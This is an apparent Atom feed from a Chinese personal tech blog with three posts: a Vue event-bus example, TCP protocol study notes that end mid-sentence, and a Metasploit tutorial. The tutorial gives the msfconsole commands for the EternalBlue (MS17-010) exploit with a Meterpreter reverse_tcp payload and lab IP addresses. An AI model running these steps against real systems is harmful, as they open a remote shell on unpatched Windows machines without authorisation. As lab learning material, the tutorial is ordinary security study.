<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Camila&#39;s blog</title>
  
  
  <link href="http://cychenhaibin.github.io/atom.xml" rel="self"/>
  
  <link href="http://cychenhaibin.github.io/"/>
  <updated>2024-11-09T02:00:20.396Z</updated>
  <id>http://cychenhaibin.github.io/</id>
  
  <author>
    <name>Camila</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title></title>
    <link href="http://cychenhaibin.github.io/2024/11/07/Kali%E6%9C%80%E5%BC%BA%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%20%E2%80%94%E2%80%94%20metasploit/"/>
    <id>http://cychenhaibin.github.io/2024/11/07/Kali%E6%9C%80%E5%BC%BA%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%20%E2%80%94%E2%80%94%20metasploit/</id>
    <published>2024-11-07T13:35:42.570Z</published>
    <updated>2024-11-09T02:00:20.396Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Kali最强渗透工具-—-metasploit"><a href="#Kali最强渗透工具-—-metasploit" class="headerlink" title="Kali最强渗透工具 — metasploit"></a>Kali最强渗透工具 — metasploit</h2><h4 id="打开metasploit工具"><a href="#打开metasploit工具" class="headerlink" title="打开metasploit工具"></a>打开metasploit工具</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br></pre></td></tr></table></figure><p>msf使用法则：</p><p>使用模块——配置模块必选项——运行模块</p><p><strong>metasploit攻击windows操作系统：</strong></p><p>搜索微软漏洞：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">search ms17_010</span><br></pre></td></tr></table></figure><ol><li><p><em><strong>使用模块</strong></em></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">use exploit/windows/smb/ms17_010_eternalblue</span><br></pre></td></tr></table></figure></li><li><p><em><strong>设置必选项</strong></em></p><p>查看必选项【*required为yes的就是必选项】</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">show options</span><br></pre></td></tr></table></figure><ul><li>RHOST：目标地址</li><li>RPORT：目标端口（445）</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Payload options 攻击载荷</span><br></pre></td></tr></table></figure><ul><li>LHOST：kali的端口</li><li>LPORT：0 – 66535</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set RHOSTS 192.168.1.133</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set lport 10001</span><br></pre></td></tr></table></figure></li><li><p><em><strong>运行</strong></em></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">run</span><br></pre></td></tr></table></figure></li></ol><h4 id="metasploit攻击永恒之蓝全流程："><a href="#metasploit攻击永恒之蓝全流程：" class="headerlink" title="metasploit攻击永恒之蓝全流程："></a>metasploit攻击永恒之蓝全流程：</h4><ol><li><p><em><strong>使用模块</strong></em></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use exploit/windows/smb/ms17_010_eternalblue</span><br></pre></td></tr></table></figure></li><li><p><em><strong>设置必选项</strong></em></p><ul><li>查看必选项【*required为yes的就是必选项】</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">show options</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set RHOSTS 192.168.1.128</span><br></pre></td></tr></table></figure><p><strong>【*RHOSTS为target hosts(s)代表你要攻击谁】</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set payload windows/x64/meterpreter/reverse_tcp</span><br></pre></td></tr></table></figure><p><strong>【*payload是攻击载荷，就是攻击完成后想干啥，这里是想获取meterpreter】</strong></p><p>【*meterpreter是metasploit后渗透的神器】</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set LHOST 192.168.1.136</span><br></pre></td></tr></table></figure><p><strong>【*LHOSTS为listen host代表你是谁，既Kali的IP地址】</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set LPORT 12345</span><br></pre></td></tr></table></figure><p><strong>【*LPORT为listen port，代表你要在kali上开启的端口，1-65535随便选，但不能被占用】</strong></p></li><li><p><em><strong>运行模块，完成攻击</strong></em></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">run</span><br></pre></td></tr></table></figure></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Kali最强渗透工具-—-metasploit&quot;&gt;&lt;a href=&quot;#Kali最强渗透工具-—-metasploit&quot; class=&quot;headerlink&quot; title=&quot;Kali最强渗透工具 — metasploit&quot;&gt;&lt;/a&gt;Kali最强渗透工具 — meta</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>bus总线传值</title>
    <link href="http://cychenhaibin.github.io/2024/11/05/%E7%BB%84%E4%BB%B6%E9%80%9A%E4%BF%A1/"/>
    <id>http://cychenhaibin.github.io/2024/11/05/%E7%BB%84%E4%BB%B6%E9%80%9A%E4%BF%A1/</id>
    <published>2024-11-04T16:06:47.000Z</published>
    <updated>2024-11-07T05:30:13.253Z</updated>
    
    <content type="html"><![CDATA[<p>场景：A组件有个点击按钮，点击后是跳转到B组件，在C组件的页面显示；C组件引用了B组件。</p><p>A组件：（传递者）</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;Button type=&quot;primary&quot; @click=&quot;preView&quot;&gt;保存&lt;/Button&gt;</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title function_">preView</span>(<span class="params"></span>) &#123;</span><br><span class="line">      <span class="keyword">let</span> res = <span class="variable language_">this</span>.<span class="title function_">judgeEmpty</span>();</span><br><span class="line">      <span class="keyword">if</span> (!res.<span class="property">status</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">$Message</span>.<span class="title function_">error</span>(res.<span class="property">message</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">isAudioUpload</span> || <span class="variable language_">this</span>.<span class="property">isVideoUpload</span>) &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">$Message</span>.<span class="title function_">error</span>(<span class="string">&quot;请等待文件上传完成&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">preViewData</span> = <span class="variable language_">this</span>.<span class="title function_">dataArrange</span>();</span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">preViewShow</span> = <span class="literal">true</span>;</span><br><span class="line">      <span class="variable language_">this</span>.<span class="title function_">sendDataToFirstComponent</span>();</span><br><span class="line">    &#125;,</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title function_">sendDataToFirstComponent</span>(<span class="params"></span>) &#123;</span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">$bus</span>.$emit(<span class="string">&#x27;update-preview-data&#x27;</span>, <span class="variable language_">this</span>.<span class="property">preViewData</span>, <span class="variable language_">this</span>.<span class="property">filePath</span>, <span class="variable language_">this</span>.<span class="property">tags</span>);</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">preViewData</span>, <span class="variable language_">this</span>.<span class="property">filePath</span>, <span class="variable language_">this</span>.<span class="property">tags</span>)</span><br><span class="line">    &#125;,</span><br></pre></td></tr></table></figure><p>B组件不用管</p><p>C组件：（接收者）</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;previewVue ref=&quot;preView&quot; :preViewData=&quot;preViewData&quot; :filePath=&quot;filePath&quot; :tags=&quot;tags&quot;&gt;&lt;/previewVue&gt;</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title function_">created</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">$bus</span>.$on(<span class="string">&#x27;update-preview-data&#x27;</span>, <span class="variable language_">this</span>.<span class="property">updatePreviewData</span>);</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="title function_">beforeDestroy</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">$bus</span>.$off(<span class="string">&#x27;update-preview-data&#x27;</span>, <span class="variable language_">this</span>.<span class="property">updatePreviewData</span>);</span><br><span class="line">  &#125;,</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title function_">updatePreviewData</span>(<span class="params">preViewData, filePath, tags</span>) &#123;</span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">preViewData</span> = preViewData;</span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">filePath</span> = filePath;</span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">tags</span> = tags;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">5</span>,<span class="variable language_">this</span>.<span class="property">preViewData</span>);</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">55</span>,<span class="variable language_">this</span>.<span class="property">filePath</span>);</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">555</span>,<span class="variable language_">this</span>.<span class="property">tags</span>);</span><br><span class="line">    &#125;,</span><br></pre></td></tr></table></figure><p>在main.js中挂载bus总线</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> bus = <span class="keyword">new</span> <span class="title class_">Vue</span>();</span><br><span class="line"><span class="title class_">Vue</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">$bus</span> = bus;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;场景：A组件有个点击按钮，点击后是跳转到B组件，在C组件的页面显示；C组件引用了B组件。&lt;/p&gt;
&lt;p&gt;A组件：（传递者）&lt;/p&gt;
&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;s</summary>
      
    
    
    
    <category term="Front-end" scheme="http://cychenhaibin.github.io/categories/Front-end/"/>
    
    
    <category term="Front-end" scheme="http://cychenhaibin.github.io/tags/Front-end/"/>
    
  </entry>
  
  <entry>
    <title>TCP篇</title>
    <link href="http://cychenhaibin.github.io/2024/11/03/TCP%E7%AF%87/"/>
    <id>http://cychenhaibin.github.io/2024/11/03/TCP%E7%AF%87/</id>
    <published>2024-11-03T01:53:47.000Z</published>
    <updated>2024-11-25T09:24:23.086Z</updated>
    
    <content type="html"><![CDATA[<h2 id="2024-11-3"><a href="#2024-11-3" class="headerlink" title="2024.11.3"></a>2024.11.3</h2><h3 id="TCP基本认识"><a href="#TCP基本认识" class="headerlink" title="TCP基本认识"></a>TCP基本认识</h3><h4 id="TCP头格式"><a href="#TCP头格式" class="headerlink" title="TCP头格式"></a>TCP头格式</h4><p><img src="https://cdn.xiaolincoding.com//mysql/other/format,png-20230309230534096.png" alt="TCP 头格式"></p><p><strong>序列号</strong>：在建立连接时由计算机生成的随机数作为其初始值，通过 SYN 包传给接收端主机，每发送一次数据，就「累加」一次该「数据字节数」的大小。<strong>用来解决网络包乱序问题。</strong></p><p><strong>确认应答号</strong>：指下一次「期望」收到的数据的序列号，发送端收到这个确认应答以后可以认为在这个序号以前的数据都已经被正常接收。<strong>用来解决丢包的问题。</strong></p><p><strong>控制位：</strong></p><ul><li><em>ACK</em>：该位为 <code>1</code> 时，「确认应答」的字段变为有效，TCP 规定除了最初建立连接时的 <code>SYN</code> 包之外该位必须设置为 <code>1</code> 。</li><li><em>RST</em>：该位为 <code>1</code> 时，表示 TCP 连接中出现异常必须强制断开连接。</li><li><em>SYN</em>：该位为 <code>1</code> 时，表示希望建立连接，并在其「序列号」的字段进行序列号初始值的设定。</li><li><em>FIN</em>：该位为 <code>1</code> 时，表示今后不会再有数据发送，希望断开连接。当通信结束希望断开连接时，通信双方的主机之间就可以相互交换 <code>FIN</code> 位为1 的 TCP 段。</li></ul><h2 id="2024-11-07"><a href="#2024-11-07" class="headerlink" title="2024.11.07"></a>2024.11.07</h2><h4 id="为什么需要TCP协议？TCP工作在哪一层？"><a href="#为什么需要TCP协议？TCP工作在哪一层？" class="headerlink" title="为什么需要TCP协议？TCP工作在哪一层？"></a>为什么需要TCP协议？TCP工作在哪一层？</h4><p><code>IP</code>层是[不可靠]的，它不保证网络包的交付、不保证网络包的按序交付、也不保证网络包中的数据的完整性。如果需要保障网络数据包的可靠性，那么就需要由上层（传输层）的 <code>TCP</code> 协议来负责。</p><p>因为 TCP 是一个工作在<strong>传输层</strong>的<strong>可靠</strong>数据传输的服务，它能确保接收端接收的网络包是<strong>无损坏、无间隔、非冗余和按序的。</strong></p><h4 id="什么是-TCP-？"><a href="#什么是-TCP-？" class="headerlink" title="什么是 TCP ？"></a>什么是 TCP ？</h4><p>TCP 是<strong>面向连接的、可靠的、基于字节流</strong>的传输层通信协议。</p><ul><li><strong>面向连接</strong>：一定是「一对一」才能连接，不能像 UDP 协议可以一个主机同时向多个主机发送消息，也就是一对多是无法做到的；</li><li><strong>可靠的</strong>：无论的网络链路中出现了怎样的链路变化，TCP 都可以保证一个报文一定能够到达接收端；</li><li><strong>字节流</strong>：用户消息通过 TCP 协议传输时，消息可能会被操作系统「分组」成多个的 TCP 报文，如果接收方的程序如果不知道「消息的边界」，是无法读出一个有效的用户消息的。并且 TCP 报文是「有序的」，当「前一个」TCP 报文没有收到的时候，即使它先收到了后面的TCP 报文，那么也不能扔给应用层去处理，同时对「重复」的 TCP 报文会自动丢弃。</li></ul><h4 id="什么是TCP连接？"><a href="#什么是TCP连接？" class="headerlink" title="什么是TCP连接？"></a>什么是TCP连接？</h4><p><strong>用于保证可靠性和流量控制维护的某些状态信息，这些信息的组合，包括 Socket、序列号和窗口大小称为连接。</strong></p><p>建立一个 TCP 连接是需要客户端与服务端达成上述三个信息的共识。</p><ul><li><strong>Socket</strong>：由 IP 地址和端口号组成</li><li><strong>序列号</strong>：用来解决乱序问题等</li><li><strong>窗口大小</strong>：用来做流量控制</li></ul><h4 id="如何唯一确定一个-TCP-连接呢？"><a href="#如何唯一确定一个-TCP-连接呢？" class="headerlink" title="如何唯一确定一个 TCP 连接呢？"></a>如何唯一确定一个 TCP 连接呢？</h4><p>TCP 四元组可以唯一的确定一个连接，四元组包括如下：</p><ul><li>源地址</li><li>源端口</li><li>目的地址</li><li>目的端口</li></ul><p>源地址和目的地址的字段（32 位）是在 IP 头部中，作用是通过 IP 协议发送报文给对方主机。</p><p>源端口和目的端口的字段（16 位）是在 TCP 头部中，作用是告诉 TCP 协议应该把报文发给哪个进程。</p><p>服务端通常固定在某个本地端口上监听，等待客户端的连接请求。</p><p>因此，客户端 IP 和端口是可变的，其理论值计算公式如下:</p><p><img src="https://cdn.xiaolincoding.com//mysql/other/format,png-20230309230436594.png" alt="img"></p><p>对 IPv4，客户端的 IP 数最多为 <code>2</code> 的 <code>32</code> 次方，客户端的端口数最多为<code>2</code> 的 <code>16</code> 次方，也就是服务端单机最大 TCP 连接数，约为 <code>2</code> 的 <code>48</code> 次方。</p><p>当然，服务端最大并发 TCP 连接数远不能达到理论上限，会受以下因素影响：</p><ul><li><strong>文件描述符限制</strong>，每个 TCP 连接都是一个文件，如果文件描述符被占满了，会发生 Too many open files。Linux 对可打开的文件描述符的数量分别作了三个方面的限制：<ul><li><strong>系统级</strong>：当前系统可打开的最大数量，通过 <code>cat /proc/sys/fs/file-max </code> 查看；</li><li><strong>用户级</strong>：指定用户可打开的最大数量，通过 <code>cat /etc/security/limits.conf</code> 查看；</li><li><strong>进程级</strong>：单个进程可打开的最大数量，通过<code>cat /proc/sys/fs/nr_open</code> 查看；</li></ul></li><li><strong>内存限制</strong>，每个 TCP 连接都要占用一定内存，操作系统的内存是有限的，如果内存资源被占满后，会发生 OOM。</li></ul><h4 id="UDP-和-TCP-有什么区别呢？分别的应用场景是？"><a href="#UDP-和-TCP-有什么区别呢？分别的应用场景是？" class="headerlink" title="UDP 和 TCP 有什么区别呢？分别的应用场景是？"></a>UDP 和 TCP 有什么区别呢？分别的应用场景是？</h4><p>UDP 不提供复杂的控制机制，利用 IP 提供面向「无连接」的通信服务。</p><p>UDP 协议真的非常简，头部只有 <code>8</code> 个字节（64 位），UDP 的头部格式如下：</p><p><img src="https://cdn.xiaolincoding.com//mysql/other/format,png-20230309230439961.png" alt="UDP 头部格式"></p><ul><li>目标和源端口：主要是告诉 UDP 协议应该把报文发给哪个进程。</li><li>包长度：该字段保存了 UDP 首部的长度跟数据的长度之和。</li><li>校验和：校验和是为了提供可靠的 UDP 首部和数据而设计，防止收到在网络传输中受损的 UDP 包。</li></ul><hr><p><strong>TCP 和 UDP 区别：</strong></p><ol><li><p><em>连接</em></p><ul><li>TCP 是面向连接的传输层协议，传输数据前先要建立连接。</li><li>UDP 是不需要连接，即刻传输数据。</li></ul></li><li><p><em>服务对象</em></p><ul><li>TCP 是一对一的两点服务，即一条连接只有两个端点。</li><li>UDP 支持一对一、一对多、多对多的交互通信</li></ul></li><li><p><em>可靠性</em></p><ul><li>TCP 是可靠交付数据的，数据可以无差错、不丢失、不重复、按序到达。</li><li>UDP 是尽最大努力交付，不保证可靠交付数据。但是我们可以基于 UDP传输协议实现一个可靠的传输协议，比如 QUIC 协议</li></ul></li><li><p><em>拥塞控制、流量控制</em></p><ul><li>TCP 有拥塞控制和流量控制机制，保证数据传输的安全性。</li><li>UDP 则没有，即使网络非常拥堵了，也不会影响 UDP 的发送速率。</li></ul></li><li><p><em>首部开销</em></p><ul><li>TCP 首部长度较长，会有一定的开销，首部在没有使用「选项」字段时是 <code>20</code> 个字节，如果使用了「选项」字段则会变长的。</li><li>UDP 首部只有 8 个字节，并且是固定不变的，开销较小。</li></ul></li><li><p><em>传输方式</em></p><ul><li>TCP 是流式传输，没有边界，但保证顺序和可靠。</li><li>UDP 是一个包一个包的发送，是有边界的，但可能会丢包和乱序。</li></ul></li><li><p><em>分片不同</em></p><ul><li><p>TCP 的数据大小如果大于 MSS 大小，则会在传输层进行分片，目标主机收到后，也同样在传输层组装 TCP 数据包，如果中途丢失了一个分片，只需要传输丢失的这个分片。</p></li><li><p>UDP 的数据大小如果大于 MTU 大小，则会在 IP 层进行分片，目标主机收到后，在 IP 层组装完数据，接着再传给传输层。</p></li></ul></li></ol><h4 id="TCP-和-UDP-应用场景："><a href="#TCP-和-UDP-应用场景：" class="headerlink" title="TCP 和 UDP 应用场景："></a>TCP 和 UDP 应用场景：</h4><p>由于 TCP 是面向连接，能保证数据的可靠性交付，因此经常用于：</p><ul><li><code>FTP</code> 文件传输；</li><li>HTTP &#x2F; HTTPS；</li></ul><p>由于 UDP 面向无连接，它可以随时发送数据，再加上 UDP 本身的处理既简单又高效，因此经常用于：</p><ul><li>包总量较少的通信，如 <code>DNS</code> 、<code>SNMP</code> 等；</li><li>视频、音频等多媒体通信；</li><li>广播通信；</li></ul><blockquote><p>为什么 UDP 头部没有「首部长度」字段，而 TCP 头部有「首部长度」字段呢？</p></blockquote><p>原因是 TCP 有<strong>可变长</strong>的「选项」字段，而 UDP 头部长度则是<strong>不会变化</strong>的，无需多一个字段去记录 UDP 的首部长度。</p><blockquote><p>为什么 UDP 头部有「包长度」字段，而 TCP 头部则没有「包长度」字段呢？</p></blockquote><p> TCP 是如何计算负载数据长度：</p><p><img src="https://cdn.xiaolincoding.com//mysql/other/format,png-20230309230445811.png" alt="img"></p><p>其中 IP 总长度 和 IP 首部长度，在 IP 首部格式是已知的。TCP 首部长度，则是在 TCP 首部格式已知的，所以就可以求得 TCP 数据的长度。</p><h3 id="TCP-和-UDP-可以使用同一个端口吗？"><a href="#TCP-和-UDP-可以使用同一个端口吗？" class="headerlink" title="TCP 和 UDP 可以使用同一个端口吗？"></a>TCP 和 UDP 可以使用同一个端口吗？</h3><p><strong>可以的</strong>。在数据链路层中，通过 MAC 地址来寻找局域网中的主机。在网际层中，通过 IP 地址来寻找网络中互连的主机或路由器。在传输层中，需要通过端口进行寻址，来识别同一计算机中同时通信的不同应用程序。</p><p>所以，传输层的「端口号」的作用，是为了区分同一个主机上不同应用程序的数据包。</p><p>传输层有两个传输协议分别是 TCP 和 UDP，在内核中是两个完全独立的软件模块。</p><p>当主机收到数据包后，可以在 IP 包头的「协议号」字段知道该数据包是TCP&#x2F;UDP，所以可以根据这个信息确定送给哪个模块（TCP&#x2F;UDP）处理，送给 TCP&#x2F;UDP 模块的报文根据「端口号」确定送给哪个应用程序处理。</p><p><img src="https://cdn.xiaolincoding.com/gh/xiaolincoder/network/port/tcp%E5%92%8Cudp%E6%A8%A1%E5%9D%97.jpeg" alt="img"></p><p>因此，TCP&#x2F;UDP 各自的端口号也相互独立，如 TCP 有一个 80 号端口，UDP也可以有一个 80 号端口，二者并不冲突。</p><h2 id="2024-11-09"><a href="#2024-11-09" class="headerlink" title="2024.11.09"></a>2024.11.09</h2><h3 id="TCP连接建立"><a href="#TCP连接建立" class="headerlink" title="TCP连接建立"></a>TCP连接建立</h3><h4 id="TCP三次握手过程是怎样的？"><a href="#TCP三次握手过程是怎样的？" class="headerlink" title="TCP三次握手过程是怎样的？"></a>TCP三次握手过程是怎样的？</h4><p>TCP 是面向连接的协议，所以使用 TCP 前必须先建立连接，三次握手的过程如下图：</p><p><img src="https://cdn.xiaolincoding.com/gh/xiaolincoder/ImageHost4/%E7%BD%91%E7%BB%9C/TCP%E4%B8%89%E6%AC%A1%E6%8F%A1%E6%89%8B.drawio.png" alt="TCP 三次握手"></p><ul><li>一开始，客户端和服务端都处于 <code>CLOSE</code> 状态。先是服务端主动监听某个端口，处于 <code>LISTEN</code> 状态</li></ul><p><img src="https://cdn.xiaolincoding.com//mysql/other/format,png-20230309230500953.png" alt="第一个报文 —— SYN 报文"></p><ul><li>客户端会随机初始化序号（<code>client_isn</code>），将此序号置于 TCP 首部的「序号」字段中，同时把 <code>SYN</code> 标志位置为 <code>1</code>，表示 <code>SYN</code> 报文。接着把第一个 SYN 报文发送给服务端，表示向服务端发起连接，该报文不包含应用层数据，之后客户端处于 <code>SYN-SENT</code> 状态。</li></ul><p><img src="https://cdn.xiaolincoding.com//mysql/other/format,png-20230309230504118.png" alt="第二个报文 —— SYN + ACK 报文"></p><ul><li>服务端收到客户端的 <code>SYN</code> 报文后，首先服务端也随机初始化自己的序号（<code>server_isn</code>），将此序号填入 TCP 首部的「序号」字段中，其次把TCP 首部的「确认应答号」字段填入 <code>client_isn + 1</code>, 接着把 <code>SYN</code> 和 <code>ACK</code> 标志位置为 <code>1</code>。最后把该报文发给客户端，该报文也不包含应用层数据，之后服务端处于 <code>SYN-RCVD</code> 状态。</li></ul><p><img src="https://cdn.xiaolincoding.com//mysql/other/format,png-20230309230508297.png" alt="第三个报文 —— ACK 报文"></p><ul><li>客户端收到服务端报文后，还要向服务端回应最后一个应答报文，首先该应答报文 TCP 首部 <code>ACK</code> 标志位置为 <code>1</code> ，其次「确认应答号」字段填入 <code>server_isn + 1</code> ，最后把报文发送给服务端，这次报文可以携带客户到服务端的数据，之后客户端处于 <code>ESTABLISHED</code> 状态。</li><li>服务端收到客户端的应答报文后，也进入 <code>ESTABLISHED</code> 状态。</li></ul><p>从上面的过程可以发现<strong>第三次握手是可以携带数据的，前两次握手是不可以携带数据的</strong>，这也是面试常问的题。</p><p>一旦完成三次握手，双方都处于 <code>ESTABLISHED</code> 状态，此时连接就已建立完成，客户端和服务端就可以相互发送数据了。</p><h4 id="为什么是三次握手？不是两次、四次？"><a href="#为什么是三次握手？不是两次、四次？" class="headerlink" title="为什么是三次握手？不是两次、四次？"></a>为什么是三次握手？不是两次、四次？</h4><p>在前面我们知道了什么是 <strong>TCP 连接</strong>：</p><ul><li>用于保证可靠性和流量控制维护的某些状态信息，这些信息的组合，包括<strong>Socket、序列号和窗口大小</strong>称为连接。</li></ul><p>所以，重要的是<strong>为什么三次握手才可以初始化 Socket、序列号和窗口大小并建立 TCP 连接。</strong></p><p>接下来，以三个方面分析三次握手的原因：</p><ul><li>三次握手才可以阻止重复历史连接的初始化（主要原因）</li><li>三次握手才可以同步双方的初始序列号</li><li>三次握手才可以避免资源浪费</li></ul><p><em><strong>原因一：避免历史连接</strong></em></p><p>三次握手的<strong>首要原因是为了防止旧的重复连接初始化造成混乱。</strong></p><p>考虑一个场景，客户端先发送了 SYN（seq &#x3D; 90）报文，然后客户端宕机了，而且这个 SYN 报文还被网络阻塞了，服务端并没有收到，接着客户端重启后，又重新向服务端建立连接，发送了 SYN（seq &#x3D; 100）报文（<em>注意！不是重传 SYN，重传的 SYN 的序列号是一样的</em>）。</p><p>三次握手是如何阻止历史连接的：</p><p><img src="https://cdn.xiaolincoding.com//mysql/other/format,png-20230309230525514.png" alt="三次握手避免历史连接"></p><p>上述中的「旧 SYN 报文」称为历史连接，TCP 使用三次握手建立连接的<strong>最主要原因就是防止「历史连接」初始化了连接</strong>。</p><p><strong>如果是两次握手连接，就无法阻止历史连接</strong>，那为什么 TCP 两次握手为什么无法阻止历史连接呢？</p><p>先直接说结论，主要是因为<strong>在两次握手的情况下，服务端没有中间状态给客户端来阻止历史连接，导致服务端可能建立一个历史连接，造成资源浪费。</strong></p><p><img src="https://cdn.xiaolincoding.com//mysql/other/fe898053d2e93abac950b1637645943f.png" alt="两次握手无法阻止历史连接"></p><p>可以看到，如果采用两次握手建立 TCP 连接的场景下，服务端在向客户端发送数据前，并没有阻止掉历史连接，导致服务端建立了一个历史连接，又白白发送了数据，妥妥地浪费了服务端的资源。</p><p>因此，<strong>要解决这种现象，最好就是在服务端发送数据前，也就是建立连接之前，要阻止掉历史连接，这样就不会造成资源浪费，而要实现这个功能，就需要三次握手</strong>。</p><p>所以，<strong>TCP 使用三次握手建立连接的最主要原因是防止「历史连接」初始化了连接。</strong></p><p><em><strong>原因二：同步双方初始序列号</strong></em></p><p>TCP 协议的通信双方， 都必须维护一个「序列号」， 序列号是可靠传输的一个关键因素，它的作用：</p><ul><li>接收方可以去除重复的数据；</li><li>接收方可以根据数据包的序列号按序接收；</li><li>可以标识发送出去的数据包中， 哪些是已经被对方收到的（通过 ACK 报文中的序列号知道）；</li></ul><p>可见，序列号在 TCP 连接中占据着非常重要的作用，所以当客户端发送携带「初始序列号」的 <code>SYN</code> 报文的时候，需要服务端回一个 <code>ACK</code> 应答报文，表示客户端的 SYN 报文已被服务端成功接收，那当服务端发送「初始序列号」给客户端的时候，依然也要得到客户端的应答回应，<strong>这样一来一回，才能确保双方的初始序列号能被可靠的同步。</strong></p><p><img src="https://cdn.xiaolincoding.com//mysql/other/format,png-20230309230639121.png" alt="四次握手与三次握手"></p><p>四次握手其实也能够可靠的同步双方的初始化序号，但由于<strong>第二步和第三步可以优化成一步</strong>，所以就成了「三次握手」。</p><p>而两次握手只保证了一方的初始序列号能被对方成功接收，没办法保证双方的初始序列号都能被确认接收。</p><p><em><strong>原因三：避免资源浪费</strong></em></p><p>如果只有「两次握手」，当客户端发生的 <code>SYN</code> 报文在网络中阻塞，客户端没有接收到 <code>ACK</code> 报文，就会重新发送 <code>SYN</code> ，<strong>由于没有第三次握手，服务端不清楚客户端是否收到了自己回复的 <code>ACK</code> 报文，所以服务端每收到一个 <code>SYN</code> 就只能先主动建立一个连接</strong>，这会造成什么情况呢？</p><p>如果客户端发送的 <code>SYN</code> 报文在网络中阻塞了，重复发送多次 <code>SYN</code> 报文，那么服务端在收到请求后就会<strong>建立多个冗余的无效链接，造成不必要的资源浪费。</strong></p><p>即两次握手会造成消息滞留情况下，服务端重复接受无用的连接请求 <code>SYN</code> 报文，而造成重复分配资源。</p><p><em><strong>小结</strong></em></p><p>TCP 建立连接时，通过三次握手<strong>能防止历史连接的建立，能减少双方不必要的资源开销，能帮助双方同步初始化序列号</strong>。序列号能够保证数据包不重复、不丢弃和按序传输。</p><p>不使用「两次握手」和「四次握手」的原因：</p><ul><li>「两次握手」：无法防止历史连接的建立，会造成双方资源的浪费，也无法可靠的同步双方序列号；</li><li>「四次握手」：三次握手就已经理论上最少可靠连接建立，所以不需要使用更多的通信次数。</li></ul><h2 id="2024-11-13"><a href="#2024-11-13" class="headerlink" title="2024.11.13"></a>2024.11.13</h2><h4 id="为什么每次建立TCP-连接时，初始化的序列号都要求不一样呢？"><a href="#为什么每次建立TCP-连接时，初始化的序列号都要求不一样呢？" class="headerlink" title="为什么每次建立TCP 连接时，初始化的序列号都要求不一样呢？"></a>为什么每次建立TCP 连接时，初始化的序列号都要求不一样呢？</h4><p>主要原因有两个方面：</p><ul><li>为了防止历史报文被下一个相同四元组的连接接收（主要方面）；</li><li>为了安全性，防止黑客伪造的相同序列号的 TCP 报文被对方接收；</li></ul><h4 id="第一次握手丢失了，会发生什么？"><a href="#第一次握手丢失了，会发生什么？" class="headerlink" title="第一次握手丢失了，会发生什么？"></a>第一次握手丢失了，会发生什么？</h4><p>当客户端想和服务端建立 TCP 连接的时候，首先第一个发的就是 SYN 报文，然后进入到 <code>SYN_SENT</code> 状态。</p><p>在这之后，如果客户端迟迟收不到服务端的 SYN-ACK 报文（第二次握手），就会触发「超时重传」机制，重传 SYN 报文，而且<strong>重传的 SYN 报文的序列号都是一样的</strong>。</p><p>当客户端在 1 秒后没收到服务端的 SYN-ACK 报文后，客户端就会重发 SYN 报文，那到底重发几次呢？</p><p>通常，第一次超时重传是在 1 秒后，第二次超时重传是在 2 秒，第三次超时重传是在 4 秒后，第四次超时重传是在 8 秒后，第五次是在超时重传 16 